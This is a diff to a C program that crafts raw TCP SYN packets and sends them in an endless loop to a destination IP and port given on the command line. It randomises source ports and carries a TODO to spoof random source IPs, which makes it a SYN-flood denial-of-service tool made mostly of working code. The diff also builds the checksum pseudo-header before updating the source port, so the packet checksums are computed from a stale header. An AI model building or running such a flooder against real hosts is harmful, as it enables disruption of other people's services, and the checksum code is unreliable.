@@ -12,7 +12,6 @@
 #include <unistd.h>
 
 #define SOURCE_IP "10.0.0.13"
-#define DEST_IP "192.168.0.10"
 
 /*
  * The pseudo header that is used in checksum calculations.
@@ -55,8 +54,15 @@ uint16_t inet_checksum(uint16_t *addr, int len)
     return (answer);
 }
 
-int main(void)
+int main(int argc, char **argv)
 {
+    if (argc != 3) {
+        fprintf(stderr, "Usage: %s dest_ip dest_port\n", argv[0]);
+        return 1;
+    }
+
+    srand(time(NULL));
+
     int fd;
     /*
      * Note the following from raw(7):
@@ -104,18 +110,43 @@ int main(void)
         .ttl = 64,
         .protocol = IPPROTO_TCP,
         .check = 0, // Again, filled in by the kernel
-        .saddr = inet_addr(SOURCE_IP),
-        .daddr = inet_addr(DEST_IP)
+        .saddr = 0, // Filled later
+        .daddr = inet_addr(argv[1]) // Checked for errors below
     };
 
+    /*
+     * Error check for inet_addr().
+     * Note the following notice from inet(3):
+     *
+     ** The inet_addr() function converts the Internet host address cp  from
+     ** IPv4  numbers-and-dots  notation  into  binary  data in network byte
+     ** order.  If  the  input  is  invalid,  INADDR_NONE  (usually  -1)  is
+     ** returned.  Use of this function is problematic because -1 is a valid
+     ** address (255.255.255.255).  Avoid its use in favor  of  inet_aton(),
+     ** inet_pton(3),  or  getaddrinfo(3),  which  provide  a cleaner way to
+     ** indicate error return.
+     *
+     * Yet we don't care because we won't be using 255.255.255.255
+     * as a dest IP anyways.
+     */
+    if (ip_header.daddr == INADDR_NONE) {
+        fprintf(stderr, "Destination IP invalid: %s\n", argv[1]);
+        return 1;
+    }
+
+    unsigned long dport;
+    dport = strtoul(argv[2], NULL, 10);
+    if (dport > 65535 || dport == 0) {
+        fprintf(stderr, "Destination port invalid: %s\n", argv[2]);
+        return 1;
+    }
     /*
      * Prepare the TCP header.
      * XXX: What can be the window size?
      */
-    srand(time(NULL));
     struct tcphdr tcp_header = {
-        .source = htons(55555),
-        .dest = htons(22),
+        .source = 0, // Filled later
+        .dest = htons(dport),
         .seq = random(),
         .ack_seq = 0,
         .res1 = 0,
@@ -128,35 +159,39 @@ int main(void)
         .urg = 0,
         .res2 = 0,
         .window = htons(65535),
-        .check = 0, // TODO
+        .check = 0, // Filled later
         .urg_ptr = 0
     };
 
-    /*
-     * See https://en.wikipedia.org/wiki/Transmission_Control_Protocol#TCP_checksum_for_IPv4
-     * for reference about the pseudo header.
-     */
-    struct tcp_pseudo_header phdr = {
-        .src.s_addr = ip_header.saddr,
-        .dst.s_addr = ip_header.daddr,
-        .pad = 0,
-        .proto = ip_header.protocol,
-        .tcp_len = sizeof(tcp_header), // No payload in SYN. Size is only of the header.
-        .tcp = tcp_header
-    };
-
-    tcp_header.check = inet_checksum((uint16_t *)&phdr, sizeof phdr);
-
-    struct sockaddr_in sin = {
-        .sin_family = AF_INET,
-        .sin_addr.s_addr = ip_header.daddr
-    };
-
     for (;;) {
+        /*
+         * TODO: Use random source IP addresses chosen from a range.
+         */
+        ip_header.saddr = inet_addr(SOURCE_IP);
+
+        /*
+         * See https://en.wikipedia.org/wiki/Transmission_Control_Protocol#TCP_checksum_for_IPv4
+         * for reference about the pseudo header.
+         */
+        struct tcp_pseudo_header phdr = {
+            .src.s_addr = ip_header.saddr,
+            .dst.s_addr = ip_header.daddr,
+            .pad = 0,
+            .proto = ip_header.protocol,
+            .tcp_len = sizeof(tcp_header), // No payload in SYN. Size is only of the header.
+            .tcp = tcp_header
+        };
+        tcp_header.source = htons((random() % (61000 - 32768 + 1)) + 32768);
+        tcp_header.check = inet_checksum((uint16_t *)&phdr, sizeof phdr);
+
         char packet_buf[sizeof tcp_header + sizeof ip_header];
-        tcp_header.source = htons((random() % 61000 - 32768 + 1) + 32768);
         memcpy(packet_buf, &ip_header, sizeof ip_header);
         memcpy(packet_buf + sizeof ip_header, &tcp_header, sizeof tcp_header);
+
+        struct sockaddr_in sin = {
+            .sin_family = AF_INET,
+            .sin_addr.s_addr = ip_header.daddr
+        };
         if (sendto(fd, packet_buf, sizeof packet_buf, 0, (struct sockaddr *)&sin, sizeof sin) == -1) {
             perror("sendto()");
             return 1;
